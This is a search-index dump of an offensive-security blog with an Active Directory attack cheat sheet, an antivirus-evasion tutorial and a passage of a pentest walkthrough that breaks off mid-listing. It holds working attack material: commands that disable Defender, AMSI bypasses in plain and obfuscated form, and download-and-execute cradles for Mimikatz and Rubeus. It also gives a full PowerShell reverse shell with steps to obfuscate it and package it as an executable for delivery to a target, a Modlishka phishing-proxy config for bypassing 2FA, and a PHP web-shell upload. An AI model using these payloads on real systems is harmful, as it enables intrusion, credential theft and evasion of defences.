{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Security Stuff \u00b6 Basic Anti-Virus Evasion From OSINT into Domain Admin Writeups \u00b6 HTB Machines Writeups Active Directory \u00b6 Active Directory","title":"Security Stuff"},{"location":"#security-stuff","text":"Basic Anti-Virus Evasion From OSINT into Domain Admin","title":"Security Stuff"},{"location":"#writeups","text":"HTB Machines Writeups","title":"Writeups"},{"location":"#active-directory","text":"Active Directory","title":"Active Directory"},{"location":"AD/","text":"General \u00b6 Oneliners \u00b6 Disable Defender Set-MpPreference -DisableRealtimeMonitoring $true Powershell AMSI Bypass [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true ) Recon \u00b6 Host Scan \u00b6 # NetDiscover (ARP Scanning): - netdiscover -i eth0 - netdiscover -r 172 .21.10.0/24 # Nmap: - nmap -sn 172 .21.10.0/24 - nmap -sn 172 .21.10.1-253 - nmap -sn 172 .21.10.* # Nbtscan: - nbtscan -r 172 .21.1.0/24 # Linux Ping Sweep (Bash) - for i in { 1 ..254 } ; do ( ping -c 1 172 .21.10. $i | grep \"bytes from\" & ) ; done # Windows Ping Sweep (Run on Windows System) - for /L %i in ( 1 ,1,255 ) do @ping -n 1 -w 200 172 .21.10.%i > nul && echo 192 .168.1.%i is up. BloodHound \u00b6 Download it from here # /usr/lib/bloodhound/resources/app/Collectors/ # From Local Windows host run as /netonly /user:domain \\u ser cmd powershell -ep bypass . . \\S harpHound.ps1 invoke-bloodhound -CollectionMethod all Enumeration \u00b6 Null Session \u00b6 Initial Access \u00b6 Kerberoasting \u00b6 SPN Service Account \u00b6 # Get all SPN accounts GetUserSPNs.py domain/user: 'password' -request # Crack the ticket hashcat -a 0 -m 13100 hash Privilege Escalation \u00b6 Lateral Movement \u00b6 Defense Evasion \u00b6 Bypass AMSI \u00b6 Get any AMSI bypass method from the following link [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true ) In Windows, run PowerShell ISE and install steroids . Link: https://powershell.one/isesteroids/quickstart/install-manually Install it manually by downloading the compressed ZIP file. After installing steroids tool, open PowerShell ISE and run the following command: start-steroids Create a new PS script and paste the AMSI bypass link. In tools menu, choose obfuscate code and run the obfuscator. Example of the generated obfuscated script: [Ref] . Assembly . GetType ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==' )))). GetField ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==' ))),$( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=' )))). SetValue ( $null , $true ) Save the generated script into the local machine. Example as amsi.txt . In the target host, download the AMSI bypass script and load it in the memory. ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/amsi.txt' ) | iex At the same time, any PowerShell script can be downloaded and executed in the memory. Examples: Mimikatz ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/Invoke-Mimikatz.ps1' ) | iex Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' BloodHound ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/Invoke-Sharphound.ps1' ) | iex Invoke-BloodHound -CollectionMethod all Rubeus ( new-object system . net . web . client ). downloadstring ( 'http://ip/amsi.txt' ) | IEX $data = ( new-object system . net . web . client ). downloadstring ( 'http://ip/rubeus.exe' ) $assem = [System.Reflection.Assembly] :: Load ( $data ) [ Rubeus . Program :: Main ( \"purge\" ). Split ()) [ Rubeus . Program :: Main ( \"s4u /user:web$ /rc4:c54444 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\" ). Split ()) Red Team \u00b6 Phishing \u00b6 # Sending mails through Linux swaks -to \" $mail \" -from \"user@security.com\" -body \"example\" -header \"Subject: example\" -server ip Bypass 2FA \u00b6 Modliska revere http proxy for phishing Link Add A record with content your domain Generate SSL Certificate openssl genrsa -out evil.com.key 4096 openssl req -new -key evil.com.key -out evil.com.csr -utf8 -batch -subj ' /CN = evil.com/ Download modlishka and create a config file, import a key, pem file using awk '{printf \"%s\\\\n\", $0}' ../evil.key { \"proxyDomain\" : \"evil.com\" , \"listeningAddress\" : \"ip\" , \"target\" : \"a.evil.com\" , \"targetResources\" : \"\" , \"targetRules\" : \"\" , \"terminateTriggers\" : \"\" , \"terminateRedirectUrl\" : \"\" , \"trackingCookie\" : \"id\" , \"trackingParam\" : \"id\" , \"jsRules\" : \"\" , \"forceHTTPS\" : false , \"forceHTTP\" : false , \"dynamicMode\" : false , \"debug\" : true , \"logPostOnly\" : false , \"disableSecurity\" : true , \"log\" : \"requests.log\" , \"plugins\" : \"all\" , \"cert\" : \"-----BEGIN CERTIFICATE-----\\n<snip>\\n-----END CERTIFICATE-----\\n\" , \"certKey\" : \"-----BEGIN RSA PRIVATE\\n<snip-----END RSA PRIVATE KEY-----\\n\" , \"certPool\" : \"\" } Run modlishka ./Modlishka -config modlishka.json","title":"General"},{"location":"AD/#general","text":"","title":"General"},{"location":"AD/#oneliners","text":"Disable Defender Set-MpPreference -DisableRealtimeMonitoring $true Powershell AMSI Bypass [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true )","title":"Oneliners"},{"location":"AD/#recon","text":"","title":"Recon"},{"location":"AD/#host-scan","text":"# NetDiscover (ARP Scanning): - netdiscover -i eth0 - netdiscover -r 172 .21.10.0/24 # Nmap: - nmap -sn 172 .21.10.0/24 - nmap -sn 172 .21.10.1-253 - nmap -sn 172 .21.10.* # Nbtscan: - nbtscan -r 172 .21.1.0/24 # Linux Ping Sweep (Bash) - for i in { 1 ..254 } ; do ( ping -c 1 172 .21.10. $i | grep \"bytes from\" & ) ; done # Windows Ping Sweep (Run on Windows System) - for /L %i in ( 1 ,1,255 ) do @ping -n 1 -w 200 172 .21.10.%i > nul && echo 192 .168.1.%i is up.","title":"Host Scan"},{"location":"AD/#bloodhound","text":"Download it from here # /usr/lib/bloodhound/resources/app/Collectors/ # From Local Windows host run as /netonly /user:domain \\u ser cmd powershell -ep bypass . . \\S harpHound.ps1 invoke-bloodhound -CollectionMethod all","title":"BloodHound"},{"location":"AD/#enumeration","text":"","title":"Enumeration"},{"location":"AD/#null-session","text":"","title":"Null Session"},{"location":"AD/#initial-access","text":"","title":"Initial Access"},{"location":"AD/#kerberoasting","text":"","title":"Kerberoasting"},{"location":"AD/#spn-service-account","text":"# Get all SPN accounts GetUserSPNs.py domain/user: 'password' -request # Crack the ticket hashcat -a 0 -m 13100 hash","title":"SPN Service Account"},{"location":"AD/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"AD/#lateral-movement","text":"","title":"Lateral Movement"},{"location":"AD/#defense-evasion","text":"","title":"Defense Evasion"},{"location":"AD/#bypass-amsi","text":"Get any AMSI bypass method from the following link [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true ) In Windows, run PowerShell ISE and install steroids . Link: https://powershell.one/isesteroids/quickstart/install-manually Install it manually by downloading the compressed ZIP file. After installing steroids tool, open PowerShell ISE and run the following command: start-steroids Create a new PS script and paste the AMSI bypass link. In tools menu, choose obfuscate code and run the obfuscator. Example of the generated obfuscated script: [Ref] . Assembly . GetType ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==' )))). GetField ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==' ))),$( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=' )))). SetValue ( $null , $true ) Save the generated script into the local machine. Example as amsi.txt . In the target host, download the AMSI bypass script and load it in the memory. ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/amsi.txt' ) | iex At the same time, any PowerShell script can be downloaded and executed in the memory. Examples: Mimikatz ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/Invoke-Mimikatz.ps1' ) | iex Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' BloodHound ( New-Object System . Net . WebClient ). DownloadString ( 'http://ip/Invoke-Sharphound.ps1' ) | iex Invoke-BloodHound -CollectionMethod all Rubeus ( new-object system . net . web . client ). downloadstring ( 'http://ip/amsi.txt' ) | IEX $data = ( new-object system . net . web . client ). downloadstring ( 'http://ip/rubeus.exe' ) $assem = [System.Reflection.Assembly] :: Load ( $data ) [ Rubeus . Program :: Main ( \"purge\" ). Split ()) [ Rubeus . Program :: Main ( \"s4u /user:web$ /rc4:c54444 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt\" ). Split ())","title":"Bypass AMSI"},{"location":"AD/#red-team","text":"","title":"Red Team"},{"location":"AD/#phishing","text":"# Sending mails through Linux swaks -to \" $mail \" -from \"user@security.com\" -body \"example\" -header \"Subject: example\" -server ip","title":"Phishing"},{"location":"AD/#bypass-2fa","text":"Modliska revere http proxy for phishing Link Add A record with content your domain Generate SSL Certificate openssl genrsa -out evil.com.key 4096 openssl req -new -key evil.com.key -out evil.com.csr -utf8 -batch -subj ' /CN = evil.com/ Download modlishka and create a config file, import a key, pem file using awk '{printf \"%s\\\\n\", $0}' ../evil.key { \"proxyDomain\" : \"evil.com\" , \"listeningAddress\" : \"ip\" , \"target\" : \"a.evil.com\" , \"targetResources\" : \"\" , \"targetRules\" : \"\" , \"terminateTriggers\" : \"\" , \"terminateRedirectUrl\" : \"\" , \"trackingCookie\" : \"id\" , \"trackingParam\" : \"id\" , \"jsRules\" : \"\" , \"forceHTTPS\" : false , \"forceHTTP\" : false , \"dynamicMode\" : false , \"debug\" : true , \"logPostOnly\" : false , \"disableSecurity\" : true , \"log\" : \"requests.log\" , \"plugins\" : \"all\" , \"cert\" : \"-----BEGIN CERTIFICATE-----\\n<snip>\\n-----END CERTIFICATE-----\\n\" , \"certKey\" : \"-----BEGIN RSA PRIVATE\\n<snip-----END RSA PRIVATE KEY-----\\n\" , \"certPool\" : \"\" } Run modlishka ./Modlishka -config modlishka.json","title":"Bypass 2FA"},{"location":"Posts/basic_av_evasion/","text":"Overview \u00b6 After I obtained eCPTX certificate and completed Offshore lab from Hack The Box I learned multiple ways to bypass Anti-Virus solutions. Offshore was containing multiple machines with AV, additionally, we faced deferent Anti-Virus solution with clients. So dealt with multiple scenarios to bypass the AV. Bypassing AV can be easy just by playing with the payload or it can be complicated, depending the AV solution and how it detect the malware (signature based, behavior based, etc...). In this blog, I'll demonstrate simple method to bypass Anti-Virus to obtain reverse shell using PowerShell script. An overview of the steps that I'll follow: Using Reverse-TCP PowerShell script. Obfuscate the Reverse-TCP PowerShell script . Base64 encoding the obfuscated Reverse-TCP PowerShell script. Using AMSI bypass script. Coverting the encoded script & AMSI bypass script into executable file. Delivering the Payload. Theory \u00b6 I'll explain here some of basic concepts of AMSI, how Anti-Virus products detect the malware and etc. So if you know the concepts you can skip this part. AMSI : AMSI stands for Anti Malware Scan Interface. AMSI is an interface for applications and services to integrate with antimalware products. AMSI used for scanning files and memory streams, content source, URL/IP reputation checks and other techniques. Detection Methods in Anti-Virus : Signature Based : by matching strings, signatures, hashes and patterns of known malware from the database. Heuristic Based : it is similar to signature based detection in terms of searching for specific strings, it looks for commands that has malicious intent and would not be mostly found in an application. Behavioral Based : it looks for events created by the program. As an example, spawinng cmd.exe or calling a sequence of functions that indicate potential process injection. Sandbox Detection : In this type of detection, the program runs in virtualized environment and it is behavior is recorded, at the end all program behavior will analyzed. The anti-virus application will be able to see in details what the program will do in that environment. Steps \u00b6 Download Reverse Shell PS Script \u00b6 Use the following PowerShell script, change listening IP and the port: reverse-tcp.ps1 $client = $null ; $stream = $null ; $buffer = $null ; $writer = $null ; $data = $null ; $result = $null ; try { $client = New-Object Net . Sockets . TcpClient ( \"127.0.0.1\" , 9000 ); $stream = $client . GetStream (); $buffer = New-Object Byte [] 1024 ; $encoding = New-Object Text . AsciiEncoding ; $writer = New-Object IO . StreamWriter ( $stream ); $writer . AutoFlush = $true ; $bytes = 0 ; do { $writer . Write ( \"PS>\" ); do { $bytes = $stream . Read ( $buffer , 0 , $buffer . Length ); if ( $bytes -gt 0 ) { $data = $data + $encoding . GetString ( $buffer , 0 , $bytes ); } } while ( $stream . DataAvailable ); if ( $bytes -gt 0 ) { $data = $data . Trim (); if ( $data . Length -gt 0 ) { try { $result = Invoke-Expression -Command $data 2 >& 1 | Out-String ; } catch { $result = $_ . Exception | Out-String ; } Clear-Variable -Name \"data\" ; $length = $result . Length ; if ( $length -gt 0 ) { $count = 0 ; do { if ( $length -ge $buffer . Length ) { $bytes = $buffer . Length ; } else { $bytes = $length ; } $writer . Write ( $result . substring ( $count , $bytes )); $count += $bytes ; $length -= $bytes ; } while ( $length -gt 0 ); Clear-Variable -Name \"result\" ; } } } } while ( $bytes -gt 0 ); } catch { Write-Host $_ . Exception . InnerException . Message ; } finally { if ( $writer -ne $null ) { $writer . Close (); $writer . Dispose (); Clear-Variable -Name \"writer\" ; } if ( $stream -ne $null ) { $stream . Close (); $stream . Dispose (); Clear-Variable -Name \"stream\" ; } if ( $client -ne $null ) { $client . Close (); $client . Dispose (); Clear-Variable -Name \"client\" ; } if ( $buffer -ne $null ) { $buffer . Clear (); Clear-Variable -Name \"buffer\" ; } if ( $result -ne $null ) { Clear-Variable -Name \"result\" ; } if ( $data -ne $null ) { Clear-Variable -Name \"data\" ; } [System.GC] :: Collect (); } Download Invoke-Obfuscator \u00b6 Download Invoke-Obfuscator from the following Github repository . Obfuscate the Reverse Shell PS Script \u00b6 In Windows host, run: powershell -exec bypass Import-Module .\\ Invoke-Obfuscation . psd1 Invoke-Obfuscation After running Invoke-Obfuscation run: Invoke-Obfuscation > set scriptpath < name of reverse tcp script >. ps1 Invoke-Obfuscation > string Invoke-Obfuscation \\ String > 1 The above script will obfuscate all strings in reverse-tcp.ps1 script. Now, copy the result into file. I'll name it as obf-reverse.ps1 , or type out in Invoke-Obfuscation to write the results into a file. Obfuscate the Obfuscated Script \u00b6 Run PowerShell ISE and install steroids . Link: https://powershell.one/isesteroids/quickstart/install-manually Tip Install it manually by downloading the compressed ZIP file. In order to avoid any errors in installation part. After installing steroids tool, open PowerShell ISE and run the following command: start-steroids Create new PS script and paste the obfuscated powershell script. In Tools menu, select Obfuscate Code and choose Binary mode. Encode the Obfuscated PS Script \u00b6 Now encode the last obfuscated PowerShell script into Base64. PS > $file = \"<obfuscated ps script>\" PS > $fc = get-content $file PS > $byt = [System.Text.Encoding] :: UTF8 . GetBytes ( $fc ) PS > $encodedtext = [System.Convert] :: ToBase64String ( $byt ) PS > echo $encodedtext Bypass AMSI \u00b6 Now let's move on the AMSI part,we need first to bypass the AMSI then we can run our reverse shell script. Again we will use here PowerShell ISE to obfuscate the script. Get any AMSI bypass method from the following link: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell Example: [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true ) In PowerShell ISE create a new PS script and paste the AMSI bypass link. In Tools menu, select Obfuscate Code and choose Character mode. Example of the generated obfuscated script: [Ref] . Assembly . GetType ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==' )))). GetField ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==' ))),$( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=' )))). SetValue ( $null , $true ) Save the generated script into the local machine. Example as amsi.txt . Memes Break \u00b6 Before we continue, let's have a short memes break: Now move on to build our executable binary and deliver it into the target. Building the Executable File \u00b6 Now we have two scripts: amsi.txt and obf-tcp.ps1 , we will combine both those scripts and convert them into executable binary using C Sharp with the help Visual Studio. Let's run Visual Studio now and create new C Sharp project. First of all, we have to enable the System.Management.Automation library in order to run PowerShell commands. Go to: Project - Add Reference , add the library System Management Automation by browsing into the following path: C : \\ Windows \\ assembly \\ GAC_MSIL \\ System . Management . Automation \\ * \\ System . Management . Automation . dll Syntax to run PowerShell commands can be found from the following link . Use the following CS program and paste your AMSI bypass and reverse shell scripts in bypassamsi and psrun parameters. using System ; using System.Collections.Generic ; using System.Linq ; using System.Management.Automation ; using System.Text ; using System.Threading.Tasks ; namespace powerreverse { class Program { static void Main ( string [] args ) { PowerShell ps = PowerShell . Create (); string bypassamsi = \"\" ; string psrun = \"\" ; ps . AddScript ( bypassamsi ); ps . AddScript ( psrun ); ps . Invoke (); } } } Now compile the program. Delivering The Payload \u00b6 WARINING By uploading the malware into Virus Total, it will send the signature of the malware to Anti-Virus products, the generated payload can't be used again because it will be detected. Preferably, upload the executable file into https://antiscan.me/ Now you can deliver the payload in the target host to obtain clean reverse shell. References \u00b6 Amsi Bypass Powershell Invoke-Obfuscation System Management Automation Steroids","title":"Basic Anti-Virus Evasion"},{"location":"Posts/basic_av_evasion/#overview","text":"After I obtained eCPTX certificate and completed Offshore lab from Hack The Box I learned multiple ways to bypass Anti-Virus solutions. Offshore was containing multiple machines with AV, additionally, we faced deferent Anti-Virus solution with clients. So dealt with multiple scenarios to bypass the AV. Bypassing AV can be easy just by playing with the payload or it can be complicated, depending the AV solution and how it detect the malware (signature based, behavior based, etc...). In this blog, I'll demonstrate simple method to bypass Anti-Virus to obtain reverse shell using PowerShell script. An overview of the steps that I'll follow: Using Reverse-TCP PowerShell script. Obfuscate the Reverse-TCP PowerShell script . Base64 encoding the obfuscated Reverse-TCP PowerShell script. Using AMSI bypass script. Coverting the encoded script & AMSI bypass script into executable file. Delivering the Payload.","title":"Overview"},{"location":"Posts/basic_av_evasion/#theory","text":"I'll explain here some of basic concepts of AMSI, how Anti-Virus products detect the malware and etc. So if you know the concepts you can skip this part. AMSI : AMSI stands for Anti Malware Scan Interface. AMSI is an interface for applications and services to integrate with antimalware products. AMSI used for scanning files and memory streams, content source, URL/IP reputation checks and other techniques. Detection Methods in Anti-Virus : Signature Based : by matching strings, signatures, hashes and patterns of known malware from the database. Heuristic Based : it is similar to signature based detection in terms of searching for specific strings, it looks for commands that has malicious intent and would not be mostly found in an application. Behavioral Based : it looks for events created by the program. As an example, spawinng cmd.exe or calling a sequence of functions that indicate potential process injection. Sandbox Detection : In this type of detection, the program runs in virtualized environment and it is behavior is recorded, at the end all program behavior will analyzed. The anti-virus application will be able to see in details what the program will do in that environment.","title":"Theory"},{"location":"Posts/basic_av_evasion/#steps","text":"","title":"Steps"},{"location":"Posts/basic_av_evasion/#download-reverse-shell-ps-script","text":"Use the following PowerShell script, change listening IP and the port: reverse-tcp.ps1 $client = $null ; $stream = $null ; $buffer = $null ; $writer = $null ; $data = $null ; $result = $null ; try { $client = New-Object Net . Sockets . TcpClient ( \"127.0.0.1\" , 9000 ); $stream = $client . GetStream (); $buffer = New-Object Byte [] 1024 ; $encoding = New-Object Text . AsciiEncoding ; $writer = New-Object IO . StreamWriter ( $stream ); $writer . AutoFlush = $true ; $bytes = 0 ; do { $writer . Write ( \"PS>\" ); do { $bytes = $stream . Read ( $buffer , 0 , $buffer . Length ); if ( $bytes -gt 0 ) { $data = $data + $encoding . GetString ( $buffer , 0 , $bytes ); } } while ( $stream . DataAvailable ); if ( $bytes -gt 0 ) { $data = $data . Trim (); if ( $data . Length -gt 0 ) { try { $result = Invoke-Expression -Command $data 2 >& 1 | Out-String ; } catch { $result = $_ . Exception | Out-String ; } Clear-Variable -Name \"data\" ; $length = $result . Length ; if ( $length -gt 0 ) { $count = 0 ; do { if ( $length -ge $buffer . Length ) { $bytes = $buffer . Length ; } else { $bytes = $length ; } $writer . Write ( $result . substring ( $count , $bytes )); $count += $bytes ; $length -= $bytes ; } while ( $length -gt 0 ); Clear-Variable -Name \"result\" ; } } } } while ( $bytes -gt 0 ); } catch { Write-Host $_ . Exception . InnerException . Message ; } finally { if ( $writer -ne $null ) { $writer . Close (); $writer . Dispose (); Clear-Variable -Name \"writer\" ; } if ( $stream -ne $null ) { $stream . Close (); $stream . Dispose (); Clear-Variable -Name \"stream\" ; } if ( $client -ne $null ) { $client . Close (); $client . Dispose (); Clear-Variable -Name \"client\" ; } if ( $buffer -ne $null ) { $buffer . Clear (); Clear-Variable -Name \"buffer\" ; } if ( $result -ne $null ) { Clear-Variable -Name \"result\" ; } if ( $data -ne $null ) { Clear-Variable -Name \"data\" ; } [System.GC] :: Collect (); }","title":"Download Reverse Shell PS Script"},{"location":"Posts/basic_av_evasion/#download-invoke-obfuscator","text":"Download Invoke-Obfuscator from the following Github repository .","title":"Download Invoke-Obfuscator"},{"location":"Posts/basic_av_evasion/#obfuscate-the-reverse-shell-ps-script","text":"In Windows host, run: powershell -exec bypass Import-Module .\\ Invoke-Obfuscation . psd1 Invoke-Obfuscation After running Invoke-Obfuscation run: Invoke-Obfuscation > set scriptpath < name of reverse tcp script >. ps1 Invoke-Obfuscation > string Invoke-Obfuscation \\ String > 1 The above script will obfuscate all strings in reverse-tcp.ps1 script. Now, copy the result into file. I'll name it as obf-reverse.ps1 , or type out in Invoke-Obfuscation to write the results into a file.","title":"Obfuscate the Reverse Shell PS Script"},{"location":"Posts/basic_av_evasion/#obfuscate-the-obfuscated-script","text":"Run PowerShell ISE and install steroids . Link: https://powershell.one/isesteroids/quickstart/install-manually Tip Install it manually by downloading the compressed ZIP file. In order to avoid any errors in installation part. After installing steroids tool, open PowerShell ISE and run the following command: start-steroids Create new PS script and paste the obfuscated powershell script. In Tools menu, select Obfuscate Code and choose Binary mode.","title":"Obfuscate the Obfuscated Script"},{"location":"Posts/basic_av_evasion/#encode-the-obfuscated-ps-script","text":"Now encode the last obfuscated PowerShell script into Base64. PS > $file = \"<obfuscated ps script>\" PS > $fc = get-content $file PS > $byt = [System.Text.Encoding] :: UTF8 . GetBytes ( $fc ) PS > $encodedtext = [System.Convert] :: ToBase64String ( $byt ) PS > echo $encodedtext","title":"Encode the Obfuscated PS Script"},{"location":"Posts/basic_av_evasion/#bypass-amsi","text":"Now let's move on the AMSI part,we need first to bypass the AMSI then we can run our reverse shell script. Again we will use here PowerShell ISE to obfuscate the script. Get any AMSI bypass method from the following link: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell Example: [Ref] . Assembly . GetType ( 'System.Management.Automation.AmsiUtils' ). GetField ( 'amsiInitFailed' , 'NonPublic,Static' ). SetValue ( $null , $true ) In PowerShell ISE create a new PS script and paste the AMSI bypass link. In Tools menu, select Obfuscate Code and choose Character mode. Example of the generated obfuscated script: [Ref] . Assembly . GetType ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==' )))). GetField ($( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==' ))),$( [Text.Encoding] :: Unicode . GetString ( [Convert] :: FromBase64String ( 'TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=' )))). SetValue ( $null , $true ) Save the generated script into the local machine. Example as amsi.txt .","title":"Bypass AMSI"},{"location":"Posts/basic_av_evasion/#memes-break","text":"Before we continue, let's have a short memes break: Now move on to build our executable binary and deliver it into the target.","title":"Memes Break"},{"location":"Posts/basic_av_evasion/#building-the-executable-file","text":"Now we have two scripts: amsi.txt and obf-tcp.ps1 , we will combine both those scripts and convert them into executable binary using C Sharp with the help Visual Studio. Let's run Visual Studio now and create new C Sharp project. First of all, we have to enable the System.Management.Automation library in order to run PowerShell commands. Go to: Project - Add Reference , add the library System Management Automation by browsing into the following path: C : \\ Windows \\ assembly \\ GAC_MSIL \\ System . Management . Automation \\ * \\ System . Management . Automation . dll Syntax to run PowerShell commands can be found from the following link . Use the following CS program and paste your AMSI bypass and reverse shell scripts in bypassamsi and psrun parameters. using System ; using System.Collections.Generic ; using System.Linq ; using System.Management.Automation ; using System.Text ; using System.Threading.Tasks ; namespace powerreverse { class Program { static void Main ( string [] args ) { PowerShell ps = PowerShell . Create (); string bypassamsi = \"\" ; string psrun = \"\" ; ps . AddScript ( bypassamsi ); ps . AddScript ( psrun ); ps . Invoke (); } } } Now compile the program.","title":"Building the Executable File"},{"location":"Posts/basic_av_evasion/#delivering-the-payload","text":"WARINING By uploading the malware into Virus Total, it will send the signature of the malware to Anti-Virus products, the generated payload can't be used again because it will be detected. Preferably, upload the executable file into https://antiscan.me/ Now you can deliver the payload in the target host to obtain clean reverse shell.","title":"Delivering The Payload"},{"location":"Posts/basic_av_evasion/#references","text":"Amsi Bypass Powershell Invoke-Obfuscation System Management Automation Steroids","title":"References"},{"location":"Posts/osint_into_da/","text":"Overview \u00b6 I\u2019ve had several customers come to me before a pentest and say they think they\u2019re in a good shape because their vulnerability scan shows no critical vulnerabilities and that they\u2019re ready for a pentest, which then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. HAUSEC Active directory penetration testing it is very important in real life and PT job role, most of (at least all) the organizations have domain controller. This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is the active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller. An overview of the stages of exploitation: OSINT Linux Privilege Escalation Pivoting Active Directory Enumeration Lateral Movement Kerberoasting Abusing Active Directory ACLs Constrained Delegation Theoretical \u00b6 First of all, active directory is designed by Microsoft and used in most of organizations as the directory service that stores all information of the organization, such as computers, users, domains, printers and etc. Attack Scenario \u00b6 Entry Point \u00b6 XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was xtech.com with the IP Address 192.168.241.204 . OSINT \u00b6 OSINT stands for Open-Source Intelligence which means the process of gathering public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. Starting from OSINT, here we will attempt to collect as much information we can about the company passively. We will focus to gather email addresses. Let's browse the company website and try to collect information from it. By going into the \" Who we are \" section, we will find three different employees with their social media accounts. In real world scenario email addresses can be collected from different ways. There are many public OSINT tools that can be utilize to collect not only the email addresses also many other information about the target company. Example of tools that can be used: Google Dorks : using google search engine, try to search for any publicly available documents from targets websites. inside those document inspect the meta-data, usually you can find usernames there. zoominfo : useful for collecting employees email addresses. rocketreach . useful for collecting employees email addresses. For our scenario, I made the lab basic in order to make easy it to understand. So now we collected three email addresses: bob.baker@xtech.local lonnie.hill@xtech.local john.doe@xtech.local We will use them later to conduct different attack. Moving forward in inspecting the website, we will notice an upload button that asking to upload PDF document. Web01 \u00b6 Initial Access \u00b6 Let's try to abuse this function by uploading simple PHP file that grant us to execute commands. This can be done using the following one-liner command: echo '<?php echo system($_GET[\"cmd\"]);?>' > cmd.php By uploading the PHP file, the website will response with the following: The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here wfuzz to brute force the directory that contains the PHP file cmd.php wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.241.204/FUZZ/cmd.php The result of this command will be: Target: http://192.168.241.204/FUZZ/cmd.php Total requests: 4614 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000004216 : 500 0 L 0 W 0 Ch \"uploads\" So we found the directory uploads , now we can browse into that directory but we will use curl instead to make HTTP GET request. curl 'http://192.168.241.204/uploads/cmd.php?cmd=id' uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data ) We have now command execution in the server with the user www-data . To obtain reverse shell, we will upload shell.php which can found from the directory /usr/share/laudanum/php/ . After upload it, setup netcat listener and browse into the uploaded PHP file. Now we obtained reverse shell on Web01 host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: $ which python3 /usr/bin/python3 $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@web01:/$ export TERM = xterm www-data@web01:/$ ^Z # <-- CRTL + Z stty raw -echo ; fg # <-- in local machine www-data@web01:/$ Pivoting to dev01 \u00b6 First, let's enumerate the users in this box: www-data@web01:~/html$ cat /etc/passwd | grep -i \"/bin/bash\" root:x:0:0:root:/root:/bin/bash dev01:x:1001:1001:devloper,devloper,,:/home/dev01:/bin/bash From the above command output, we identified that there are two users root and dev01 . Next, let's enumerate website files. www-data@web01:~/html$ ls -la total 104 drwxr-xr-x 8 www-data www-data 4096 Dec 18 09 :59 . drwxr-xr-x 4 dev01 dev01 4096 Dec 17 